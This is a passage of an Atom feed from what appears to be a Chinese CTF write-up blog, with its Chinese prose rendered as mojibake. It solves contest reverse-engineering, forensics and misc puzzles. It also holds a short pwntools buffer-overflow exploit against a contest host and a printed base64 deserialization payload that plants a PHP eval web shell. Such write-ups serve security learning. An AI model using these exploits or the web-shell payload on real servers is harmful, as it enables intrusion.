class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    t+=<span class="built_in">chr</span>(flag(s[i],i))</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="comment"># flag&#123;RrrrEe33202111&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ANDROID"><a href="#ANDROID" class="headerlink" title="ANDROID"></a>ANDROID</h3><p>jadxæŸ¥çœ‹MainActivityä¸»é€»è¾‘ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">String trim = <span class="keyword">this</span>.input.getText().toString().trim();</span><br><span class="line"><span class="keyword">int</span>[] iArr = &#123;<span class="number">102</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">28</span>, <span class="number">127</span>, <span class="number">55</span>, <span class="number">99</span>, <span class="number">19</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">121</span>, <span class="number">58</span>, <span class="number">83</span>, <span class="number">30</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">42</span>&#125;;</span><br><span class="line"><span class="keyword">int</span>[] iArr2 = &#123;<span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>&#125;;</span><br><span class="line"><span class="keyword">if</span> (trim.length() != <span class="number">18</span>) &#123;</span><br><span class="line"><span class="keyword">this</span>.input.setText(<span class="string">&quot;FLAGé”™è¯¯&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span>[] charArray = trim.toCharArray();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">17</span>; i++) &#123;</span><br><span class="line">iArr2[i] = i % <span class="number">2</span> == <span class="number">0</span> ? charArray[i] ^ i : charArray[i] ^ charArray[i + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">String str = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i2 = <span class="number">0</span>; i2 &lt; <span class="number">18</span>; i2++) &#123;</span><br><span class="line">str = str.concat(Integer.toHexString(iArr2[i2])).concat(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(str);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i3 = <span class="number">0</span>; i3 &lt; <span class="number">18</span>; i3++) &#123;</span><br><span class="line"><span class="keyword">if</span> (iArr2[i3] != iArr[i3]) &#123;</span><br><span class="line"><span class="keyword">this</span>.input.setText(<span class="string">&quot;FLAGé”™è¯¯ï¼&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.input.setText(<span class="string">&quot;FLAGæ­£ç¡®&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨z3è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag=[BitVec(<span class="string">f&#x27;flag<span class="subst">&#123;i&#125;</span>&#x27;</span>,<span class="number">7</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>)]</span><br><span class="line">out=[<span class="number">102</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">28</span>, <span class="number">127</span>, <span class="number">55</span>, <span class="number">99</span>, <span class="number">19</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">121</span>, <span class="number">58</span>, <span class="number">83</span>, <span class="number">30</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">42</span>]</span><br><span class="line"></span><br><span class="line">s=[<span class="number">42</span>]*<span class="number">19</span></span><br><span class="line">ss=Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        s[i]=flag[i]^i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s[i]=flag[i]^flag[i+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    ss.add(s[i]==out[i])</span><br><span class="line"></span><br><span class="line">ss.check()</span><br><span class="line">m=ss.model()</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    res+=(<span class="built_in">chr</span>(m[flag[i]].as_long()))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># flag&#123;Reverse__APP</span></span><br></pre></td></tr></table></figure><p>åŠ èŠ±æ‹¬å·é—­åˆï¼Œå¾—åˆ°flagï¼šflag{Reverse__APP}</p><p>â€‹    </p><h3 id="WAY"><a href="#WAY" class="headerlink" title="WAY"></a>WAY</h3><blockquote><p>flag{md5(result)}</p></blockquote><p>æ£€æµ‹å¸¦upxå£³ï¼Œè„±å£³åIDAæŸ¥çœ‹ä¼ªç ï¼Œè¿·å®«é¢˜ï¼Œwsadä»£è¡¨ä¸Šä¸‹å·¦å³ï¼Œæå–è¿·å®«æ•°ç»„å¾—ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">OIIII</span><br><span class="line">OOIO#</span><br><span class="line">IOOOI</span><br><span class="line">IOIOI</span><br><span class="line">IIIII</span><br></pre></td></tr></table></figure><p>å®¹æ˜“å¾—åˆ°è·¯å¾„ï¼šsdsddwdï¼ŒMD5å¾—åˆ°flagï¼šflag{6654b3343f6f3f6223a721e7f65e87f8}</p><p>â€‹    </p><h3 id="SPARK"><a href="#SPARK" class="headerlink" title="SPARK"></a>SPARK</h3><p>Sparcæ¶æ„ï¼ŒIDAæ— æ³•åç¼–è¯‘ä¸ºä¼ªç ï¼Œç”¨Ghidraå¾—åˆ°ä¼ªç ä¸»é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">undefined8 <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  longlong unaff_g7;</span><br><span class="line">  <span class="keyword">int</span> local_res7d3;</span><br><span class="line">  undefined8 local_res7d7;</span><br><span class="line">  undefined8 local_res7df;</span><br><span class="line">  undefined8 local_res7e7;</span><br><span class="line">  undefined8 local_res7ef;</span><br><span class="line">  longlong local_res7f7;</span><br><span class="line">  </span><br><span class="line">  local_res7f7 = *(longlong *)(unaff_g7 + <span class="number">0x28</span>);</span><br><span class="line">  local_res7d7 = <span class="number">0</span>;</span><br><span class="line">  local_res7df = <span class="number">0</span>;</span><br><span class="line">  local_res7e7 = <span class="number">0x37463f3044413243</span>;</span><br><span class="line">  local_res7ef = <span class="number">0x3429000000000000</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input_sparkle_flag_here:\n&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>,&amp;local_res7d7,<span class="number">0xc</span>);</span><br><span class="line">  local_res7d3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">9</span> &lt; local_res7d3) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;good_job!&quot;</span>);</span><br><span class="line">LAB_001008a0:</span><br><span class="line">      <span class="keyword">if</span> (local_res7f7 == *(longlong *)(unaff_g7 + <span class="number">0x28</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">      __stack_chk_fail();</span><br><span class="line">    &#125;</span><br><span class="line">    *(<span class="keyword">char</span> *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) =</span><br><span class="line">         *(<span class="keyword">char</span> *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) + <span class="number">-0x2f</span>;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">char</span> *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) !=</span><br><span class="line">        *(<span class="keyword">char</span> *)((longlong)&amp;local_res7e7 + (longlong)local_res7d3)) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;incorrect\n&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LAB_001008a0;</span><br><span class="line">    &#125;</span><br><span class="line">    local_res7d3 = local_res7d3 + <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€»è¾‘ä¸ºè¾“å…¥flagå€¼é€å­—ç¬¦ <code>-0x2f</code> å¾—åˆ°çš„å­—ç¬¦ä¸²ä¸ <code>0x37463f30444132433429</code> ç›¸ç­‰ï¼Œå³ROT47ã€‚</p><p>ç®€å•è¿˜åŸå¾—flagï¼šflag{fun_sparcX}</p><p>â€‹    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="Ez-pwn"><a href="#Ez-pwn" class="headerlink" title="Ez_pwn"></a>Ez_pwn</h3><p>ç®€å•ret2textï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;hsc2019.site&#x27;</span>,<span class="number">10891</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(<span class="number">0x400741</span>)</span><br><span class="line">r.sendline(pl)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;æœ¬å±ŠHSC1th 2022æ˜¯ç”±ç¤¾ä¼šæˆ˜é˜Ÿçº¢å®¢çªå‡»é˜Ÿï¼ˆHonker Security Commandoï¼‰ä¸¾åŠã€‚ æœ¬æ¬¡æ¯”èµ›å°†é‡‡ç”¨åœ¨çº¿ç½‘ç»œå®‰å…¨å¤ºæ——æŒ‘æˆ˜èµ›çš„å½¢å¼ï¼Œæ¶µç›–webï¼Œcryptoï¼Œmiscï¼Œreç­‰ä¸»æµæ–¹å‘ï¼Œå¹¶é¢å‘å…¨çƒå¼€æ”¾ã€‚æ¯”èµ›ä¸‰ç”²å¯è·çªå‡»é˜Ÿå‘¨è¾¹ç¤¼å“ã€‚</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022èµ›" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>é•¿å®‰â€œæˆ˜ç–«â€ç½‘ç»œå®‰å…¨å«å£«å®ˆæŠ¤èµ›</title>
    <link href="https://lazzzaro.github.io/2022/01/08/match-%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2022/01/08/match-%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/</id>
    <published>2022-01-08T10:00:01.000Z</published>
    <updated>2022-01-08T12:51:09.214Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>æ–°å† ç–«æƒ…è‚†è™å…¨çƒï¼Œè¿™ä¸€åœºç–«æƒ…é˜»å‡»æˆ˜ä¸ä»…æ˜¯æˆ‘å›½å«ç”Ÿå¥åº·é¢†åŸŸçš„ä¸€åœºæˆ˜ç–«ï¼Œä¹Ÿæ˜¯ç§‘å­¦æŠ€æœ¯é¢†åŸŸçš„ä¸€æ¬¡å¤§è€ƒã€‚åœ¨è¿™ä¸ªç‰¹æ®Šæ—¶æœŸï¼Œä¿éšœç½‘ç»œå®‰å…¨ï¼Œé˜²èŒƒåˆ©ç”¨æ–°å† è‚ºç‚ç–«æƒ…å®æ–½çš„ç½‘ç»œæ”»å‡»è¡Œä¸ºæ˜¯å…³ç³»å¹¿å¤§äººæ°‘ç¾¤ä¼—åˆ‡èº«åˆ©ç›Šçš„å¤§äº‹ã€‚å¦‚ç½‘ç»œæ”»å‡»è€…å°†è®¡ç®—æœºç—…æ¯’ã€æœ¨é©¬å’Œç§»åŠ¨æ¶æ„ç¨‹åºç­‰ä¼ªè£…æˆâ€œè‚ºç‚ç—…ä¾‹â€â€œé˜²æŠ¤é€šçŸ¥â€ç­‰ä¿¡æ¯ï¼Œé€šè¿‡é’“é±¼é‚®ä»¶ã€æ¶æ„é“¾æ¥ç­‰æ–¹å¼è¿›è¡Œä¼ æ’­ï¼Œé€ æˆç”¨æˆ·å®‰å…¨é—®é¢˜ã€‚</p><p>è¥¿å®‰æ•°æ‰€é«˜æ ¡å­¦ç”Ÿå›¢ä½“è”åˆå‘èµ·é•¿å®‰æˆ˜ç–«ç½‘ç»œå®‰å…¨å…¬ç›Šç§‘æ™®èµ›å’Œé•¿å®‰æˆ˜ç–«â€œç½‘ç»œå®‰å…¨å«å£«â€å®ˆæŠ¤èµ›ï¼Œä¸€æ–¹é¢æå‡å…¨æ°‘ç–«æƒ…æœŸé—´çš„ç½‘ç»œå®‰å…¨æ„è¯†ä¸ç–«æƒ…ä¸­å¸¸è§é—®é¢˜çš„åº”å¯¹æªæ–½ï¼Œå¦ä¸€æ–¹é¢æå‡æˆ‘çœçš„ç½‘ç»œå®‰å…¨åº”æ€¥å“åº”èƒ½åŠ›å’Œç½‘ç»œå®‰å…¨ä»ä¸šè€…æŠ€æœ¯èƒ½åŠ›ï¼ŒååŠ©ç”¨æˆ·æå‡ç½‘ç»œå®‰å…¨é˜²æŠ¤èƒ½åŠ›ï¼Œä¸ºæˆ˜èƒœæ–°å† è‚ºç‚æä¾›ç½‘ç»œç©ºé—´ä¿éšœã€‚</p><p>Rank: 14</p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="å…«å¦è¿·å®«"><a href="#å…«å¦è¿·å®«" class="headerlink" title="å…«å¦è¿·å®«"></a>å…«å¦è¿·å®«</h3><blockquote><p>ä¸€èµ·èµ°è¿·å®«å§ï¼Œè¦æäº¤å…¨æ‹¼éŸ³å­—ç¬¦å¥¥</p></blockquote><p><img src="/2022/01/08/match-%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/maze.png" alt="maze" style="zoom: 33%;"></p><p>èµ°è¿·å®«ï¼Œä¸²è”ç»è¿‡çš„å…«å¦å¯¹åº”æ–‡å­—ï¼š<code>cazy&#123;æˆ˜é•¿æ™é•¿æˆ˜æ™æ²³é•¿å±±å±±å®‰æˆ˜ç–«ç–«æˆ˜ç–«å®‰ç–«é•¿å®‰æ™&#125;</code>ï¼Œè½¬ä¸ºå…¨æ‹¼ï¼š</p><p><code>cazy&#123;zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang&#125;</code></p><p>â€‹    </p><h3 id="æœ´å®æ— åçš„å–è¯"><a href="#æœ´å®æ— åçš„å–è¯" class="headerlink" title="æœ´å®æ— åçš„å–è¯"></a>æœ´å®æ— åçš„å–è¯</h3><p>xpå†…å­˜å–è¯ï¼Œå…ˆåˆ¤æ–­profile</p><p><code>volatility -f xp_sp3.raw imageinfo</code></p><p>æŸ¥çœ‹è¿›ç¨‹ </p><p><code>volatility -f xp_sp3.raw --profile=WinXPSP2x86 pslist</code></p><p>å‘ç°notepadå’Œmspaintï¼ŒæŸ¥çœ‹è®°äº‹æœ¬</p><p><code>volatility -f xp_sp3.raw --profile=WinXPSP2x86 notepad</code></p><p>æ‰¾åˆ°ä¿¡æ¯ï¼š <code>20211209(Encrypt)</code>ã€‚</p><p>å†æŸ¥çœ‹æ¡Œé¢æ–‡ä»¶</p><p><code>volatility -f xp_sp3.raw --profile=WinXPSP2x86 filescan | grep -E &quot;æ¡Œé¢&quot;</code></p><p>æ‰¾åˆ°æ–‡ä»¶ <code>flag.zip</code> å’Œ <code>flag.png</code>ï¼Œåˆ†åˆ«dumpä¸‹æ¥</p><p><code>flag.png</code> ä¸­æœ‰å¯†æ–‡ä¿¡æ¯ï¼š <code>FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]</code>ï¼Œ</p><p><code>flag.zip</code> æœ‰å¯†ç ï¼Œç”¨å‰é¢çš„ <code>20211209</code> è§£å¼€æ‰¾åˆ°åŠ å¯†ç®—æ³•ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Encrypt</span><span class="params">(<span class="built_in">string</span>&amp; str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; str.length(); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(str[i] &gt;=<span class="string">&#x27;a&#x27;</span>&amp;&amp; str[i]&lt;=<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">str[i]+=<span class="number">3</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(str[i]==<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">str[i]=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(str[i]==<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">str[i]=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(str[i]==<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">str[i]=<span class="string">&#x27;c&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(str[i]==<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">str[i]=<span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">str[i] -= <span class="number">32</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿˜åŸflagï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">list</span>(<span class="string">b&#x27;FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]&#x27;</span>)</span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;w&#x27;</span>):</span><br><span class="line">        x += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="built_in">ord</span>(<span class="string">&#x27;x&#x27;</span>):</span><br><span class="line">        x = <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> x == <span class="built_in">ord</span>(<span class="string">&#x27;y&#x27;</span>):</span><br><span class="line">        x = <span class="built_in">ord</span>(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> x == <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        x = <span class="built_in">ord</span>(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> x == <span class="built_in">ord</span>(<span class="string">&#x27;_&#x27;</span>):</span><br><span class="line">        x = <span class="built_in">ord</span>(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">    x -= <span class="number">32</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> encrypt(j) == s[i]:</span><br><span class="line">            t += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t += <span class="string">&#x27;?&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"></span><br><span class="line"><span class="comment"># cazy&#123;Xian?will?certainly?succeed?in?fighting?the?epidemic&#125;</span></span><br></pre></td></tr></table></figure><p><code>?</code> æ”¹ <code>_</code> ï¼Œå¾—åˆ°flagï¼š<code>cazy&#123;Xian_will_certainly_succeed_in_fighting_the_epidemic&#125;</code></p><p>â€‹    </p><h3 id="æ— å­—å¤©ä¹¦"><a href="#æ— å­—å¤©ä¹¦" class="headerlink" title="æ— å­—å¤©ä¹¦"></a>æ— å­—å¤©ä¹¦</h3><p>åœ¨æµé‡åŒ…ä¸­å‘ç° <code>secret</code> æµé‡ï¼Œdumpå¾—åˆ°gzipåŒ…ï¼Œå†…å®¹ä¸ºä¸€ä¸²16è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå…¶ä¸­åŒ…å« <code>504B0304</code>ï¼Œè½¬å­˜ä¸ºzipæ–‡ä»¶ï¼Œå†…å« <code>flag.txt</code> å’Œ <code>key.ws</code> ä¸¤ä¸ªçº¯ç©ºç™½å­—ç¬¦æ–‡ä»¶ã€‚</p><p><code>key.ws</code> ä¸­åŒ…å«ç©ºæ ¼ä¸tabå­—ç¬¦åŠå¤§é‡æ¢è¡Œç¬¦ï¼Œä¸ºwhitespaceè¯­è¨€ï¼Œ<a href="https://ideone.com/l/whitespace">åœ¨çº¿è¿è¡Œ</a>å¾—åˆ°è¾“å‡º <code>XiAnWillBeSafe</code>ï¼›</p><p><code>flag.txt</code> ä¸­åŒ…å«å¤§é‡ç©ºæ ¼ä¸tabå­—ç¬¦ï¼Œä¸ºsnowéšå†™ï¼Œå¯†ç  <code>XiAnWillBeSafe</code>ï¼Œè§£å¯†ï¼š</p><p><code>SNOW.EXE -C -p XiAnWillBeSafe flag.txt</code>ï¼Œå¾—åˆ°flagï¼š</p><p><code>cazy&#123;C4n_y0u_underSt4nd_th3_b0oK_With0ut_Str1ng&#125;</code></p><p>â€‹    </p><h3 id="è¥¿å®‰åŠ æ²¹"><a href="#è¥¿å®‰åŠ æ²¹" class="headerlink" title="è¥¿å®‰åŠ æ²¹"></a>è¥¿å®‰åŠ æ²¹</h3><p>åœ¨æµé‡åŒ…ä¸­å‘ç° <code>secret.txt</code> æµé‡ï¼Œdumpä¸‹æ¥base64è§£ç å¾—åˆ°zipæ–‡ä»¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;secret.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;out.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(base64.b64decode(f))</span><br></pre></td></tr></table></figure><p>æ‰“å¼€ä¸ºæ‹¼å›¾ï¼Œå…±48å¼ ï¼Œé€‰æ‹©å¸¦flagçš„éƒ¨åˆ†å›¾ç‰‡çº¯æ‰‹æ‹¼ï¼š</p><p><img src="/2022/01/08/match-%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/pintu.png" alt="pintu" style="zoom: 67%;"></p><p>flagï¼š<code>cazy&#123;make_XiAN_great_Again&#125;</code></p><p>â€‹    </p><h3 id="ez-Encrypt"><a href="#ez-Encrypt" class="headerlink" title="ez_Encrypt"></a>ez_Encrypt</h3><p>æŸ¥çœ‹æµé‡ï¼Œå‘ç°æ˜¯èšå‰‘æµé‡ï¼Œå…¶ä¸­ä¸€ä¸ªæµä¸­</p><p><code>TzozOToiTGVhZ3VlXEZseXN5c3RlbVxDYWNoZWRcU3RvcmFnZVxBZGFwdGVyIjo1OntzOjc6IgAqAGZpbGUiO3M6MTE6Ii4vc2hlbGwucGhwIjtzOjEwOiIAKgBhZGFwdGVyIjtPOjMwOiJMZWFndWVcRmx5c3lzdGVtXEFkYXB0ZXJcTG9jYWwiOjE6e3M6MTM6IgAqAHdyaXRlRmxhZ3MiO2k6MDt9czo5OiIAKgBleHBpcmUiO047czoxMToiACoAYXV0b3NhdmUiO2I6MDtzOjg6IgAqAGNhY2hlIjthOjE6e2k6MDtzOjI5OiI8P3BocCBldmFsKCRfUE9TVFsnY2F6eSddKSA%2FPiI7fX0%3D</code></p><p>base64è§£ç ä¸º 